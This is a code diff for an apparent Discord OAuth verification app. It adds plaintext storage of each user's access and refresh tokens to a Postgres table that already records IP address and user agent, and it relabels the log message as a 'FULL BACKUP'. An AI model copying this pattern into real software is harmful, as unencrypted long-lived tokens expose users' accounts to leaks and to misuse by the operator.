@@ -24,10 +24,22 @@ async function initDatabase() {
         user_id TEXT PRIMARY KEY,
         username TEXT NOT NULL,
         avatar TEXT,
+        access_token TEXT,
+        refresh_token TEXT,
         verified_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
         ip_address TEXT,
         user_agent TEXT
       );
+    `);
+
+    await pool.query(`
+      ALTER TABLE verified_users
+      ADD COLUMN IF NOT EXISTS access_token TEXT;
+    `);
+
+    await pool.query(`
+      ALTER TABLE verified_users
+      ADD COLUMN IF NOT EXISTS refresh_token TEXT;
     `);
 
     console.log("Connected to Postgres ✅");
@@ -81,6 +93,7 @@ app.get("/callback", async (req, res) => {
     );
 
     const accessToken = tokenRes.data.access_token;
+    const refreshToken = tokenRes.data.refresh_token || null;
 
     const userRes = await axios.get("https://discord.com/api/users/@me", {
       headers: {
@@ -129,23 +142,35 @@ app.get("/callback", async (req, res) => {
         user_id,
         username,
         avatar,
+        access_token,
+        refresh_token,
         verified_at,
         ip_address,
         user_agent
       )
-      VALUES ($1, $2, $3, NOW(), $4, $5)
+      VALUES ($1, $2, $3, $4, $5, NOW(), $6, $7)
       ON CONFLICT (user_id)
       DO UPDATE SET
         username = EXCLUDED.username,
         avatar = EXCLUDED.avatar,
+        access_token = EXCLUDED.access_token,
+        refresh_token = EXCLUDED.refresh_token,
         verified_at = NOW(),
         ip_address = EXCLUDED.ip_address,
         user_agent = EXCLUDED.user_agent
       `,
-      [userId, username, avatar, ipAddress, userAgent]
+      [
+        userId,
+        username,
+        avatar,
+        accessToken,
+        refreshToken,
+        ipAddress,
+        userAgent,
+      ]
     );
 
-    console.log(`Saved verified user ✅ ${username} (${userId})`);
+    console.log(`Saved FULL BACKUP ✅ ${username} (${userId})`);
 
     return res.redirect("https://lucianoire.github.io/?success=true");
   } catch (err) {
